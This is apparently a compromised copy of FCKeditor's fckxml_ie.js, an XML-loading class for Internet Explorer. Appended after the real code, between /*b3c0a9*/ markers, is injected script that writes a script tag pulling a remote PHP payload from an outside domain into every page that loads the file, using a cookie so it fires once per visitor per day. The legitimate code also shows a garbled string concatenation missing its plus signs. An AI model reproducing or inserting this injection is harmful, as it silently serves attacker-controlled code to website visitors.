/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fckxml_ie.js
 * 	FCKXml Class: class to load and manipulate XML files.
 * 	(IE specific implementation)
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

var FCKXml ;

if ( !( FCKXml = NS.FCKXml ) )
{
	FCKXml = NS.FCKXml = function()
	{
		this.Error = false ;
	}

	FCKXml.prototype.LoadUrl = function( urlToCall )
	{
		this.Error = false ;

		var oXmlHttp = FCKTools.CreateXmlObject( 'XmlHttp' ) ;

		if ( !oXmlHttp )
		{
			this.Error = true ;
			return ;
		}

		oXmlHttp.open( "GET", urlToCall, false ) ;
		
		oXmlHttp.send( null ) ;
		
		if ( oXmlHttp.status == 200 || oXmlHttp.status == 304 )
			this.DOMDocument = oXmlHttp.responseXML ;
		else if ( oXmlHttp.status == 0 && oXmlHttp.readyState == 4 )
		{
			this.DOMDocument = FCKTools.CreateXmlObject( 'DOMDocument' ) ;
			this.DOMDocument.async = false ;
			this.DOMDocument.resolveExternals = false ;
			this.DOMDocument.loadXML( oXmlHttp.responseText ) ;
		}
		else
		{
			this.Error = true ;
			alert( 'Error loading "'   urlToCall   '"' ) ;
		}
	}

	FCKXml.prototype.SelectNodes = function( xpath, contextNode )
	{
		if ( this.Error )
			return new Array() ;

		if ( contextNode )
			return contextNode.selectNodes( xpath ) ;
		else
			return this.DOMDocument.selectNodes( xpath ) ;
	}

	FCKXml.prototype.SelectSingleNode = function( xpath, contextNode ) 
	{
		if ( this.Error )
			return ;
			
		if ( contextNode )
			return contextNode.selectSingleNode( xpath ) ;
		else
			return this.DOMDocument.selectSingleNode( xpath ) ;
	}
}

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
